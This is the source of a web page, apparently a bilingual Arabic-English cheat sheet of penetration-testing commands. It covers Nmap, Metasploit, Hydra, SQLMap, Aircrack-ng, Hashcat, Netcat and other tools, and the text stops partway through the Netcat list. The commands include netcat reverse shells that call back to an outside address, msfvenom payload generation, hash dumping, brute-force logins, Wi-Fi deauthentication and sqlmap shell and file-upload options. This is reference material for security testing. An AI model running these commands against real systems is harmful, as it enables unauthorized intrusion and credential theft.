import Navbar from "@/components/Navbar";
import Footer from "@/components/Footer";
import { Terminal, ChevronDown, ChevronUp, Copy, Check, Search, Globe, Network, Shield, Globe2, Radio, Key, Zap, Database, Wifi, Lock, Bug, Server, Scan, Eye, Hash, UserX, Code, Laptop, Fingerprint, Target, FileSearch, Settings, Crosshair, Skull, AlertTriangle, Layers, Binary, Unplug, HardDrive, Monitor, Cpu, Activity, ShieldAlert, Wrench, FileTerminal } from "lucide-react";
import { useState, useMemo } from "react";
import { LucideIcon } from "lucide-react";

interface Command {
  command: string;
  description: { ar: string; en: string };
}

interface Tool {
  name: string;
  description: { ar: string; en: string };
  commands: Command[];
  icon?: LucideIcon;
}

// Tool icons mapping
const toolIcons: Record<string, LucideIcon> = {
  "Nmap": Network,
  "Metasploit": Skull,
  "Burp Suite": Globe2,
  "Wireshark": Activity,
  "John the Ripper": Key,
  "Hydra": Zap,
  "SQLMap": Database,
  "Aircrack-ng": Wifi,
  "Nikto": Bug,
  "Hashcat": Hash,
  "Gobuster": FileSearch,
  "Netcat": Unplug,
  "Enum4linux": Monitor,
  "Dirb": Eye,
  "Wfuzz": Crosshair,
  "theHarvester": Scan,
  "Maltego": Fingerprint,
  "Responder": ShieldAlert,
  "Recon-ng": Target,
  "CrackMapExec": HardDrive,
  "Sn1per": Crosshair,
  "Wpscan": Shield,
  "Ffuf": Binary,
  "Feroxbuster": Layers,
  "Crackmapexec": Cpu,
  "Impacket": Wrench,
  "BeEF": AlertTriangle,
  "SET": Settings,
  "Mimikatz": Lock,
  "BloodHound": Scan,
};

const tools: Tool[] = [
  {
    name: "Nmap",
    description: { ar: "أداة فحص الشبكات واكتشاف المنافذ المفتوحة", en: "Network scanning and port discovery tool" },
    commands: [
      { command: "nmap -sP 192.168.1.0/24", description: { ar: "فحص جميع الأجهزة في الشبكة (Ping Scan)", en: "Scan all devices in network (Ping Scan)" } },
      { command: "nmap -sS 192.168.1.1", description: { ar: "فحص سريع للمنافذ (SYN Scan)", en: "Fast port scan (SYN Scan)" } },
      { command: "nmap -sV 192.168.1.1", description: { ar: "اكتشاف إصدارات الخدمات", en: "Service version detection" } },
      { command: "nmap -O 192.168.1.1", description: { ar: "اكتشاف نظام التشغيل", en: "OS detection" } },
      { command: "nmap -A 192.168.1.1", description: { ar: "فحص شامل", en: "Aggressive scan" } },
      { command: "nmap -p 1-65535 192.168.1.1", description: { ar: "فحص جميع المنافذ", en: "Full port scan" } },
      { command: "nmap -sU 192.168.1.1", description: { ar: "فحص منافذ UDP", en: "UDP port scan" } },
      { command: "nmap --script vuln 192.168.1.1", description: { ar: "فحص الثغرات", en: "Vulnerability scan" } },
      { command: "nmap -sN 192.168.1.1", description: { ar: "فحص خفي (Null Scan)", en: "Stealth scan (Null Scan)" } },
      { command: "nmap -oN scan.txt 192.168.1.1", description: { ar: "حفظ النتائج في ملف", en: "Save results to file" } },
      { command: "nmap -sC 192.168.1.1", description: { ar: "تشغيل السكربتات الافتراضية", en: "Run default scripts" } },
      { command: "nmap -Pn 192.168.1.1", description: { ar: "تخطي Ping واعتبار الهدف متصل", en: "Skip ping, treat host as online" } },
      { command: "nmap -T4 192.168.1.1", description: { ar: "فحص سريع (Aggressive Timing)", en: "Fast scan (Aggressive Timing)" } },
      { command: "nmap --script http-enum 192.168.1.1", description: { ar: "اكتشاف مجلدات الويب", en: "Web directory enumeration" } },
      { command: "nmap -sS -sV -O -A 192.168.1.1", description: { ar: "فحص شامل مع كل الميزات", en: "Full scan with all features" } },
      { command: "nmap --script smb-vuln* 192.168.1.1", description: { ar: "فحص ثغرات SMB", en: "SMB vulnerability scan" } },
      { command: "nmap -sV --version-intensity 5 192.168.1.1", description: { ar: "فحص عميق للإصدارات", en: "Deep version scan" } },
      { command: "nmap --top-ports 1000 192.168.1.1", description: { ar: "فحص أشهر 1000 منفذ", en: "Scan top 1000 ports" } },
      { command: "nmap -f 192.168.1.1", description: { ar: "تقسيم الحزم لتجاوز الجدار الناري", en: "Fragment packets for firewall evasion" } },
      { command: "nmap --spoof-mac 0 192.168.1.1", description: { ar: "استخدام MAC عشوائي", en: "Use random MAC address" } },
    ],
  },
  {
    name: "Metasploit",
    description: { ar: "إطار عمل لاختبار الاختراق وتنفيذ الثغرات", en: "Penetration testing framework" },
    commands: [
      { command: "msfconsole", description: { ar: "تشغيل واجهة Metasploit", en: "Start Metasploit console" } },
      { command: "search exploit/windows", description: { ar: "البحث عن ثغرات ويندوز", en: "Search Windows exploits" } },
      { command: "use exploit/multi/handler", description: { ar: "استخدام مستقبل الاتصالات", en: "Use connection handler" } },
      { command: "set PAYLOAD windows/meterpreter/reverse_tcp", description: { ar: "تعيين Payload", en: "Set payload" } },
      { command: "set LHOST 192.168.1.100", description: { ar: "تعيين IP المهاجم", en: "Set attacker IP" } },
      { command: "set LPORT 4444", description: { ar: "تعيين المنفذ", en: "Set port" } },
      { command: "exploit", description: { ar: "تنفيذ الاستغلال", en: "Execute exploit" } },
      { command: "sessions -l", description: { ar: "عرض الجلسات النشطة", en: "List active sessions" } },
      { command: "sessions -i 1", description: { ar: "الدخول للجلسة", en: "Interact with session" } },
      { command: "db_nmap -sV 192.168.1.1", description: { ar: "فحص Nmap وحفظ في قاعدة البيانات", en: "Nmap scan and save to DB" } },
      { command: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe", description: { ar: "إنشاء Payload", en: "Generate payload" } },
      { command: "use auxiliary/scanner/portscan/tcp", description: { ar: "فحص المنافذ", en: "Port scanner" } },
      { command: "use post/windows/gather/hashdump", description: { ar: "استخراج الهاشات", en: "Dump hashes" } },
      { command: "background", description: { ar: "إرسال الجلسة للخلفية", en: "Background session" } },
      { command: "use exploit/windows/smb/ms17_010_eternalblue", description: { ar: "ثغرة EternalBlue", en: "EternalBlue exploit" } },
      { command: "search type:exploit platform:linux", description: { ar: "البحث عن ثغرات لينكس", en: "Search Linux exploits" } },
      { command: "show options", description: { ar: "عرض الخيارات المتاحة", en: "Show options" } },
      { command: "info exploit/windows/smb/ms08_067", description: { ar: "معلومات عن ثغرة", en: "Exploit info" } },
      { command: "vulns", description: { ar: "عرض الثغرات المكتشفة", en: "Show discovered vulnerabilities" } },
      { command: "workspace -a pentest", description: { ar: "إنشاء مساحة عمل جديدة", en: "Create new workspace" } },
    ],
  },
  {
    name: "Burp Suite",
    description: { ar: "أداة لفحص تطبيقات الويب واكتشاف الثغرات", en: "Web application security testing tool" },
    commands: [
      { command: "Proxy → Intercept → On", description: { ar: "تفعيل اعتراض الطلبات", en: "Enable request interception" } },
      { command: "Target → Site map", description: { ar: "عرض خريطة الموقع", en: "View site map" } },
      { command: "Intruder → Positions", description: { ar: "تحديد نقاط الحقن", en: "Set injection points" } },
      { command: "Repeater → Send", description: { ar: "إعادة إرسال الطلبات", en: "Resend requests" } },
      { command: "Scanner → Active scan", description: { ar: "فحص تلقائي للثغرات", en: "Active vulnerability scan" } },
      { command: "Decoder → Encode/Decode", description: { ar: "تشفير وفك تشفير", en: "Encode/Decode" } },
      { command: "Comparer → Compare", description: { ar: "مقارنة استجابتين", en: "Compare responses" } },
      { command: "Extender → BApp Store", description: { ar: "تثبيت إضافات", en: "Install extensions" } },
      { command: "Options → Upstream Proxy", description: { ar: "إعداد بروكسي", en: "Configure proxy" } },
      { command: "Logger → View logs", description: { ar: "عرض السجلات", en: "View logs" } },
      { command: "Intruder → Sniper Attack", description: { ar: "هجوم Sniper", en: "Sniper attack" } },
      { command: "Intruder → Cluster Bomb", description: { ar: "هجوم Cluster Bomb", en: "Cluster Bomb attack" } },
      { command: "Collaborator → Poll now", description: { ar: "فحص Collaborator", en: "Poll Collaborator" } },
      { command: "Target → Scope → Add", description: { ar: "إضافة للنطاق", en: "Add to scope" } },
      { command: "Proxy → Options → Match and Replace", description: { ar: "تعديل الطلبات تلقائياً", en: "Auto-modify requests" } },
      { command: "Sequencer → Live capture", description: { ar: "تحليل التوكنات", en: "Token analysis" } },
      { command: "Scanner → Crawl", description: { ar: "زحف الموقع", en: "Crawl site" } },
      { command: "Proxy → HTTP history", description: { ar: "سجل الطلبات", en: "Request history" } },
      { command: "Target → Issues", description: { ar: "عرض المشاكل المكتشفة", en: "View issues" } },
      { command: "Dashboard → Event log", description: { ar: "سجل الأحداث", en: "Event log" } },
    ],
  },
  {
    name: "Wireshark",
    description: { ar: "أداة تحليل حزم الشبكة", en: "Network packet analyzer" },
    commands: [
      { command: "ip.addr == 192.168.1.1", description: { ar: "فلترة حسب IP", en: "Filter by IP" } },
      { command: "tcp.port == 80", description: { ar: "فلترة حسب منفذ TCP", en: "Filter by TCP port" } },
      { command: "http", description: { ar: "عرض HTTP فقط", en: "Show HTTP only" } },
      { command: "dns", description: { ar: "عرض DNS فقط", en: "Show DNS only" } },
      { command: "tcp.flags.syn == 1", description: { ar: "عرض حزم SYN", en: "Show SYN packets" } },
      { command: "frame contains \"password\"", description: { ar: "البحث عن كلمة", en: "Search for word" } },
      { command: "ip.src == 192.168.1.1", description: { ar: "فلترة حسب المصدر", en: "Filter by source" } },
      { command: "ip.dst == 192.168.1.1", description: { ar: "فلترة حسب الوجهة", en: "Filter by destination" } },
      { command: "Follow TCP Stream", description: { ar: "تتبع محادثة TCP", en: "Follow TCP stream" } },
      { command: "Statistics → Protocol Hierarchy", description: { ar: "إحصائيات البروتوكولات", en: "Protocol statistics" } },
      { command: "http.request.method == \"POST\"", description: { ar: "طلبات POST فقط", en: "POST requests only" } },
      { command: "tcp.analysis.retransmission", description: { ar: "الحزم المعاد إرسالها", en: "Retransmitted packets" } },
      { command: "!arp", description: { ar: "استبعاد ARP", en: "Exclude ARP" } },
      { command: "ssl.handshake", description: { ar: "عرض SSL Handshake", en: "Show SSL Handshake" } },
      { command: "ftp", description: { ar: "عرض FTP فقط", en: "Show FTP only" } },
      { command: "icmp", description: { ar: "عرض ICMP فقط", en: "Show ICMP only" } },
      { command: "tcp.stream eq 0", description: { ar: "عرض Stream محدد", en: "Show specific stream" } },
      { command: "http.response.code == 404", description: { ar: "أخطاء 404", en: "404 errors" } },
      { command: "eth.addr == aa:bb:cc:dd:ee:ff", description: { ar: "فلترة حسب MAC", en: "Filter by MAC" } },
      { command: "Statistics → Conversations", description: { ar: "المحادثات الشبكية", en: "Network conversations" } },
    ],
  },
  {
    name: "John the Ripper",
    description: { ar: "أداة لكسر كلمات المرور", en: "Password cracking tool" },
    commands: [
      { command: "john --wordlist=rockyou.txt hash.txt", description: { ar: "كسر باستخدام قائمة", en: "Crack with wordlist" } },
      { command: "john --format=raw-md5 hash.txt", description: { ar: "كسر MD5", en: "Crack MD5" } },
      { command: "john --show hash.txt", description: { ar: "عرض المكسورة", en: "Show cracked" } },
      { command: "john --incremental hash.txt", description: { ar: "هجوم تزايدي", en: "Incremental attack" } },
      { command: "john --rules hash.txt", description: { ar: "استخدام قواعد", en: "Use rules" } },
      { command: "unshadow /etc/passwd /etc/shadow > hash.txt", description: { ar: "دمج ملفات لينكس", en: "Merge Linux files" } },
      { command: "john --format=NT hash.txt", description: { ar: "كسر NTLM", en: "Crack NTLM" } },
      { command: "john --fork=4 hash.txt", description: { ar: "استخدام 4 أنوية", en: "Use 4 cores" } },
      { command: "john --restore", description: { ar: "استكمال جلسة", en: "Resume session" } },
      { command: "john --list=formats", description: { ar: "عرض الصيغ المدعومة", en: "List supported formats" } },
      { command: "john --pot=cracked.pot hash.txt", description: { ar: "حفظ في ملف مخصص", en: "Save to custom file" } },
      { command: "john --mask=?a?a?a?a hash.txt", description: { ar: "هجوم Mask", en: "Mask attack" } },
      { command: "john --single hash.txt", description: { ar: "وضع Single Crack", en: "Single crack mode" } },
      { command: "john --loopback hash.txt", description: { ar: "إعادة استخدام المكسورة", en: "Reuse cracked passwords" } },
      { command: "john --format=sha512crypt hash.txt", description: { ar: "كسر SHA512", en: "Crack SHA512" } },
      { command: "zip2john file.zip > hash.txt", description: { ar: "استخراج هاش ZIP", en: "Extract ZIP hash" } },
      { command: "pdf2john file.pdf > hash.txt", description: { ar: "استخراج هاش PDF", en: "Extract PDF hash" } },
      { command: "john --session=crack1 hash.txt", description: { ar: "حفظ الجلسة باسم", en: "Save session with name" } },
      { command: "john --status", description: { ar: "حالة الكسر", en: "Crack status" } },
      { command: "john --wordlist=wordlist.txt --rules=best64 hash.txt", description: { ar: "قائمة مع قواعد", en: "Wordlist with rules" } },
    ],
  },
  {
    name: "Hydra",
    description: { ar: "أداة لهجمات القوة الغاشمة", en: "Brute force attack tool" },
    commands: [
      { command: "hydra -l admin -P pass.txt 192.168.1.1 ssh", description: { ar: "هجوم SSH", en: "SSH attack" } },
      { command: "hydra -L users.txt -P pass.txt 192.168.1.1 ftp", description: { ar: "هجوم FTP", en: "FTP attack" } },
      { command: "hydra -l admin -P pass.txt 192.168.1.1 http-post-form \"/login:user=^USER^&pass=^PASS^:F=incorrect\"", description: { ar: "هجوم نموذج ويب", en: "Web form attack" } },
      { command: "hydra -l admin -P pass.txt rdp://192.168.1.1", description: { ar: "هجوم RDP", en: "RDP attack" } },
      { command: "hydra -l admin -P pass.txt mysql://192.168.1.1", description: { ar: "هجوم MySQL", en: "MySQL attack" } },
      { command: "hydra -t 4 -l admin -P pass.txt ssh://192.168.1.1", description: { ar: "4 محاولات متزامنة", en: "4 concurrent attempts" } },
      { command: "hydra -V -l admin -P pass.txt 192.168.1.1 ssh", description: { ar: "وضع مفصل", en: "Verbose mode" } },
      { command: "hydra -e nsr -l admin -P pass.txt 192.168.1.1 ssh", description: { ar: "تجربة كلمات مرور فارغة", en: "Try empty passwords" } },
      { command: "hydra -o results.txt -l admin -P pass.txt 192.168.1.1 ssh", description: { ar: "حفظ النتائج", en: "Save results" } },
      { command: "hydra -x 6:8:aA1 192.168.1.1 ssh -l admin", description: { ar: "توليد كلمات مرور", en: "Generate passwords" } },
      { command: "hydra -l admin -P pass.txt smb://192.168.1.1", description: { ar: "هجوم SMB", en: "SMB attack" } },
      { command: "hydra -l admin -P pass.txt telnet://192.168.1.1", description: { ar: "هجوم Telnet", en: "Telnet attack" } },
      { command: "hydra -l admin -P pass.txt vnc://192.168.1.1", description: { ar: "هجوم VNC", en: "VNC attack" } },
      { command: "hydra -l admin -P pass.txt pop3://192.168.1.1", description: { ar: "هجوم POP3", en: "POP3 attack" } },
      { command: "hydra -l admin -P pass.txt imap://192.168.1.1", description: { ar: "هجوم IMAP", en: "IMAP attack" } },
      { command: "hydra -l admin -P pass.txt smtp://192.168.1.1", description: { ar: "هجوم SMTP", en: "SMTP attack" } },
      { command: "hydra -l admin -P pass.txt ldap://192.168.1.1", description: { ar: "هجوم LDAP", en: "LDAP attack" } },
      { command: "hydra -s 8080 -l admin -P pass.txt 192.168.1.1 http-get", description: { ar: "منفذ مخصص", en: "Custom port" } },
      { command: "hydra -w 10 -l admin -P pass.txt 192.168.1.1 ssh", description: { ar: "وقت انتظار 10 ثواني", en: "10 second wait" } },
      { command: "hydra -R", description: { ar: "استكمال جلسة سابقة", en: "Resume previous session" } },
    ],
  },
  {
    name: "SQLMap",
    description: { ar: "أداة آلية لاكتشاف واستغلال ثغرات SQL", en: "Automatic SQL injection tool" },
    commands: [
      { command: "sqlmap -u \"http://site.com/page?id=1\"", description: { ar: "فحص رابط", en: "Scan URL" } },
      { command: "sqlmap -u \"URL\" --dbs", description: { ar: "استخراج قواعد البيانات", en: "Extract databases" } },
      { command: "sqlmap -u \"URL\" -D dbname --tables", description: { ar: "استخراج الجداول", en: "Extract tables" } },
      { command: "sqlmap -u \"URL\" -D dbname -T users --dump", description: { ar: "تفريغ البيانات", en: "Dump data" } },
      { command: "sqlmap -u \"URL\" --current-user", description: { ar: "المستخدم الحالي", en: "Current user" } },
      { command: "sqlmap -u \"URL\" --is-dba", description: { ar: "صلاحيات المدير", en: "DBA check" } },
      { command: "sqlmap -u \"URL\" --os-shell", description: { ar: "الحصول على Shell", en: "Get shell" } },
      { command: "sqlmap -r request.txt", description: { ar: "فحص من ملف", en: "Scan from file" } },
      { command: "sqlmap -u \"URL\" --level=5 --risk=3", description: { ar: "فحص عميق", en: "Deep scan" } },
      { command: "sqlmap -u \"URL\" --tamper=space2comment", description: { ar: "تجاوز الحماية", en: "Bypass filters" } },
      { command: "sqlmap -u \"URL\" --batch", description: { ar: "وضع تلقائي", en: "Batch mode" } },
      { command: "sqlmap -u \"URL\" --passwords", description: { ar: "استخراج كلمات المرور", en: "Extract passwords" } },
      { command: "sqlmap -u \"URL\" --file-read=/etc/passwd", description: { ar: "قراءة ملف", en: "Read file" } },
      { command: "sqlmap -u \"URL\" --file-write=shell.php --file-dest=/var/www/html/", description: { ar: "رفع ملف", en: "Upload file" } },
      { command: "sqlmap -u \"URL\" --sql-shell", description: { ar: "SQL Shell تفاعلي", en: "Interactive SQL shell" } },
      { command: "sqlmap -u \"URL\" --dbms=mysql", description: { ar: "تحديد نوع قاعدة البيانات", en: "Specify DBMS" } },
      { command: "sqlmap -u \"URL\" --technique=BEUST", description: { ar: "تحديد التقنيات", en: "Specify techniques" } },
      { command: "sqlmap -u \"URL\" --threads=10", description: { ar: "10 خيوط متوازية", en: "10 parallel threads" } },
      { command: "sqlmap -u \"URL\" --random-agent", description: { ar: "User-Agent عشوائي", en: "Random User-Agent" } },
      { command: "sqlmap -u \"URL\" --tor", description: { ar: "استخدام Tor", en: "Use Tor" } },
    ],
  },
  {
    name: "Aircrack-ng",
    description: { ar: "مجموعة أدوات لاختبار أمان شبكات Wi-Fi", en: "Wi-Fi security testing suite" },
    commands: [
      { command: "airmon-ng start wlan0", description: { ar: "تفعيل وضع المراقبة", en: "Enable monitor mode" } },
      { command: "airodump-ng wlan0mon", description: { ar: "مسح الشبكات", en: "Scan networks" } },
      { command: "airodump-ng -c 6 --bssid XX:XX:XX -w capture wlan0mon", description: { ar: "التقاط حزم شبكة محددة", en: "Capture specific network" } },
      { command: "aireplay-ng -0 10 -a XX:XX:XX wlan0mon", description: { ar: "هجوم Deauth", en: "Deauth attack" } },
      { command: "aircrack-ng -w wordlist.txt capture.cap", description: { ar: "كسر WPA/WPA2", en: "Crack WPA/WPA2" } },
      { command: "aireplay-ng -1 0 -a XX:XX:XX wlan0mon", description: { ar: "مصادقة مزيفة", en: "Fake auth" } },
      { command: "aireplay-ng -3 -b XX:XX:XX wlan0mon", description: { ar: "إعادة حقن ARP", en: "ARP replay" } },
      { command: "airmon-ng check kill", description: { ar: "إيقاف العمليات المتعارضة", en: "Kill conflicting processes" } },
      { command: "airmon-ng stop wlan0mon", description: { ar: "إيقاف وضع المراقبة", en: "Stop monitor mode" } },
      { command: "aircrack-ng -J hashcat capture.cap", description: { ar: "تصدير لـ Hashcat", en: "Export for Hashcat" } },
      { command: "airodump-ng --encrypt wpa wlan0mon", description: { ar: "عرض WPA فقط", en: "Show WPA only" } },
      { command: "aireplay-ng -9 wlan0mon", description: { ar: "اختبار الحقن", en: "Injection test" } },
      { command: "airbase-ng -a XX:XX:XX -e FakeAP wlan0mon", description: { ar: "إنشاء نقطة وصول مزيفة", en: "Create fake AP" } },
      { command: "airdecap-ng -w passphrase capture.cap", description: { ar: "فك تشفير الحزم", en: "Decrypt packets" } },
      { command: "besside-ng wlan0mon", description: { ar: "كسر تلقائي", en: "Auto crack" } },
      { command: "airodump-ng --wps wlan0mon", description: { ar: "عرض شبكات WPS", en: "Show WPS networks" } },
      { command: "packetforge-ng -0 -a XX:XX:XX -h YY:YY:YY -k 255.255.255.255 -l 255.255.255.255 -y frag.xor -w arp.cap", description: { ar: "إنشاء حزمة ARP", en: "Forge ARP packet" } },
      { command: "airolib-ng mydb --import passwd rockyou.txt", description: { ar: "إنشاء قاعدة بيانات PMK", en: "Create PMK database" } },
      { command: "airodump-ng -c 1,6,11 wlan0mon", description: { ar: "مسح قنوات محددة", en: "Scan specific channels" } },
      { command: "aircrack-ng -b XX:XX:XX capture.cap", description: { ar: "كسر BSSID محدد", en: "Crack specific BSSID" } },
    ],
  },
  {
    name: "Nikto",
    description: { ar: "أداة فحص الثغرات في خوادم الويب", en: "Web server vulnerability scanner" },
    commands: [
      { command: "nikto -h http://192.168.1.1", description: { ar: "فحص أساسي", en: "Basic scan" } },
      { command: "nikto -h http://192.168.1.1 -p 8080", description: { ar: "فحص منفذ محدد", en: "Scan specific port" } },
      { command: "nikto -h http://192.168.1.1 -ssl", description: { ar: "فحص HTTPS", en: "Scan HTTPS" } },
      { command: "nikto -h http://192.168.1.1 -o report.html -Format htm", description: { ar: "تقرير HTML", en: "HTML report" } },
      { command: "nikto -h http://192.168.1.1 -Tuning 9", description: { ar: "فحص SQL Injection", en: "SQL Injection scan" } },
      { command: "nikto -h http://192.168.1.1 -evasion 1", description: { ar: "تجاوز IDS", en: "IDS evasion" } },
      { command: "nikto -h http://192.168.1.1 -maxtime 60s", description: { ar: "تحديد الوقت", en: "Set time limit" } },
      { command: "nikto -h http://192.168.1.1 -C all", description: { ar: "فحص جميع CGI", en: "Scan all CGI" } },
      { command: "nikto -h http://192.168.1.1 -Display V", description: { ar: "عرض تفاصيل", en: "Show details" } },
      { command: "nikto -update", description: { ar: "تحديث قاعدة البيانات", en: "Update database" } },
      { command: "nikto -h http://192.168.1.1 -Tuning 1", description: { ar: "اختبار الملفات المثيرة", en: "Interesting files" } },
      { command: "nikto -h http://192.168.1.1 -Tuning 2", description: { ar: "إعدادات خاطئة", en: "Misconfigurations" } },
      { command: "nikto -h http://192.168.1.1 -Tuning 3", description: { ar: "الإفصاح عن المعلومات", en: "Info disclosure" } },
      { command: "nikto -h http://192.168.1.1 -Tuning 4", description: { ar: "حقن XSS", en: "XSS injection" } },
      { command: "nikto -h http://192.168.1.1 -id admin:password", description: { ar: "مصادقة HTTP", en: "HTTP auth" } },
      { command: "nikto -h http://192.168.1.1 -useproxy http://127.0.0.1:8080", description: { ar: "استخدام بروكسي", en: "Use proxy" } },
      { command: "nikto -h targets.txt", description: { ar: "فحص من ملف", en: "Scan from file" } },
      { command: "nikto -h http://192.168.1.1 -no404", description: { ar: "تجاهل 404", en: "Ignore 404" } },
      { command: "nikto -h http://192.168.1.1 -root /admin", description: { ar: "تحديد المسار الجذري", en: "Set root path" } },
      { command: "nikto -h http://192.168.1.1 -Pause 5", description: { ar: "إيقاف مؤقت 5 ثواني", en: "5 second pause" } },
    ],
  },
  {
    name: "Hashcat",
    description: { ar: "أداة كسر الهاش باستخدام GPU", en: "GPU hash cracking tool" },
    commands: [
      { command: "hashcat -m 0 hash.txt wordlist.txt", description: { ar: "كسر MD5", en: "Crack MD5" } },
      { command: "hashcat -m 1000 hash.txt wordlist.txt", description: { ar: "كسر NTLM", en: "Crack NTLM" } },
      { command: "hashcat -m 1800 hash.txt wordlist.txt", description: { ar: "كسر SHA512", en: "Crack SHA512" } },
      { command: "hashcat -m 22000 hash.hc22000 wordlist.txt", description: { ar: "كسر WPA2", en: "Crack WPA2" } },
      { command: "hashcat -a 3 -m 0 hash.txt ?a?a?a?a?a?a", description: { ar: "هجوم Mask", en: "Mask attack" } },
      { command: "hashcat -a 0 -m 0 hash.txt wordlist.txt -r rules.rule", description: { ar: "هجوم مع قواعد", en: "Attack with rules" } },
      { command: "hashcat -a 6 -m 0 hash.txt wordlist.txt ?d?d", description: { ar: "هجوم مختلط", en: "Hybrid attack" } },
      { command: "hashcat -m 0 hash.txt wordlist.txt --show", description: { ar: "عرض المكسورة", en: "Show cracked" } },
      { command: "hashcat -m 0 hash.txt wordlist.txt -O", description: { ar: "تحسين الأداء", en: "Optimize performance" } },
      { command: "hashcat -I", description: { ar: "معلومات الأجهزة", en: "Device info" } },
      { command: "hashcat --benchmark", description: { ar: "اختبار الأداء", en: "Benchmark" } },
      { command: "hashcat -m 0 hash.txt wordlist.txt --increment", description: { ar: "وضع تزايدي", en: "Increment mode" } },
      { command: "hashcat -m 0 hash.txt wordlist.txt -w 3", description: { ar: "وضع أداء عالي", en: "High performance" } },
      { command: "hashcat -m 0 hash.txt wordlist.txt --session=crack1", description: { ar: "حفظ الجلسة", en: "Save session" } },
      { command: "hashcat --restore", description: { ar: "استكمال الجلسة", en: "Restore session" } },
      { command: "hashcat -m 0 hash.txt wordlist.txt --potfile-disable", description: { ar: "تعطيل Potfile", en: "Disable potfile" } },
      { command: "hashcat -m 0 hash.txt wordlist.txt --force", description: { ar: "تجاوز التحذيرات", en: "Force run" } },
      { command: "hashcat -m 0 hash.txt -a 1 dict1.txt dict2.txt", description: { ar: "هجوم Combinator", en: "Combinator attack" } },
      { command: "hashcat -m 400 hash.txt wordlist.txt", description: { ar: "كسر WordPress", en: "Crack WordPress" } },
      { command: "hashcat -m 1500 hash.txt wordlist.txt", description: { ar: "كسر DES", en: "Crack DES" } },
    ],
  },
  {
    name: "Gobuster",
    description: { ar: "أداة اكتشاف المجلدات والملفات", en: "Directory and file discovery tool" },
    commands: [
      { command: "gobuster dir -u http://target.com -w wordlist.txt", description: { ar: "اكتشاف المجلدات", en: "Directory discovery" } },
      { command: "gobuster dns -d target.com -w subdomains.txt", description: { ar: "اكتشاف النطاقات الفرعية", en: "Subdomain discovery" } },
      { command: "gobuster vhost -u http://target.com -w hosts.txt", description: { ar: "اكتشاف Virtual Hosts", en: "Virtual host discovery" } },
      { command: "gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt", description: { ar: "البحث عن امتدادات محددة", en: "Search specific extensions" } },
      { command: "gobuster dir -u http://target.com -w wordlist.txt -t 50", description: { ar: "50 خيط متوازي", en: "50 parallel threads" } },
      { command: "gobuster dir -u http://target.com -w wordlist.txt -o results.txt", description: { ar: "حفظ النتائج", en: "Save results" } },
      { command: "gobuster dir -u http://target.com -w wordlist.txt -c 'session=abc123'", description: { ar: "استخدام كوكيز", en: "Use cookies" } },
      { command: "gobuster dir -u http://target.com -w wordlist.txt -a 'Mozilla/5.0'", description: { ar: "تغيير User-Agent", en: "Custom User-Agent" } },
      { command: "gobuster dir -u http://target.com -w wordlist.txt -r", description: { ar: "تتبع إعادة التوجيه", en: "Follow redirects" } },
      { command: "gobuster dir -u http://target.com -w wordlist.txt -k", description: { ar: "تجاهل شهادة SSL", en: "Ignore SSL cert" } },
      { command: "gobuster dir -u http://target.com -w wordlist.txt -b 404,403", description: { ar: "تجاهل أكواد محددة", en: "Ignore specific codes" } },
      { command: "gobuster dir -u http://target.com -w wordlist.txt -s 200,301", description: { ar: "عرض أكواد محددة فقط", en: "Show only specific codes" } },
      { command: "gobuster dir -u http://target.com -w wordlist.txt --wildcard", description: { ar: "التعامل مع Wildcard", en: "Handle wildcard" } },
      { command: "gobuster dir -u http://target.com -w wordlist.txt -U admin -P password", description: { ar: "مصادقة HTTP", en: "HTTP auth" } },
      { command: "gobuster dir -u http://target.com -w wordlist.txt -p http://127.0.0.1:8080", description: { ar: "استخدام بروكسي", en: "Use proxy" } },
      { command: "gobuster fuzz -u http://target.com/FUZZ -w wordlist.txt", description: { ar: "وضع Fuzzing", en: "Fuzzing mode" } },
      { command: "gobuster dir -u http://target.com -w wordlist.txt --no-error", description: { ar: "تجاهل الأخطاء", en: "Ignore errors" } },
      { command: "gobuster dir -u http://target.com -w wordlist.txt -d", description: { ar: "عرض نص الاستجابة", en: "Show response body" } },
      { command: "gobuster dir -u http://target.com -w wordlist.txt --delay 100ms", description: { ar: "تأخير بين الطلبات", en: "Delay between requests" } },
      { command: "gobuster dir -u http://target.com -w wordlist.txt -e", description: { ar: "عرض الروابط الكاملة", en: "Show full URLs" } },
    ],
  },
  {
    name: "Netcat",
    description: { ar: "أداة الشبكات متعددة الاستخدامات", en: "Versatile networking tool" },
    commands: [
      { command: "nc -lvnp 4444", description: { ar: "الاستماع على منفذ", en: "Listen on port" } },
      { command: "nc 192.168.1.1 4444", description: { ar: "الاتصال بمنفذ", en: "Connect to port" } },
      { command: "nc -e /bin/bash 192.168.1.1 4444", description: { ar: "Reverse Shell", en: "Reverse shell" } },
      { command: "nc -lvnp 4444 > file.txt", description: { ar: "استقبال ملف", en: "Receive file" } },
      { command: "nc 192.168.1.1 4444 < file.txt", description: { ar: "إرسال ملف", en: "Send file" } },
      { command: "nc -zv 192.168.1.1 1-1000", description: { ar: "فحص المنافذ", en: "Port scan" } },
      { command: "nc -lvnp 4444 -k", description: { ar: "استماع مستمر", en: "Persistent listen" } },
      { command: "nc -u -lvnp 4444", description: { ar: "استماع UDP", en: "UDP listen" } },
      { command: "nc -nvlp 4444 -c 'echo Welcome'", description: { ar: "تنفيذ أمر عند الاتصال", en: "Execute on connect" } },
      { command: "nc -w 5 192.168.1.1 4444", description: { ar: "وقت انتظار 5 ثواني", en: "5 second timeout" } },
      { command: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 4444 >/tmp/f", description: { ar: "Reverse Shell مع FIFO", en: "Reverse shell with FIFO" } },
      { command: "nc -lvnp 80 < index.html", description: { ar: "خادم HTTP بسيط", en: "Simple HTTP server" } },
      { command: "echo 'GET / HTTP/1.1\\nHost: target.com\\n\\n' | nc target.com 80", description: { ar: "طلب HTTP يدوي", en: "Manual HTTP request" } },
      { command: "nc -lvnp 4444 2>&1 | tee capture.txt", description: { ar: "تسجيل الاتصال", en: "Log connection" } },
      { command: "nc -x proxy:8080 target.com 80", description: { ar: "الاتصال عبر بروكسي", en: "Connect via proxy" } },
      { command: "nc -C target.com 25", description: { ar: "اتصال SMTP", en: "SMTP connection" } },
      { command: "while true; do nc -lvnp 4444; done", description: { ar: "استماع متكرر", en: "Repeated listen" } },
      { command: "nc -s 192.168.1.100 192.168.1.1 4444", description: { ar: "تحديد IP المصدر", en: "Specify source IP" } },
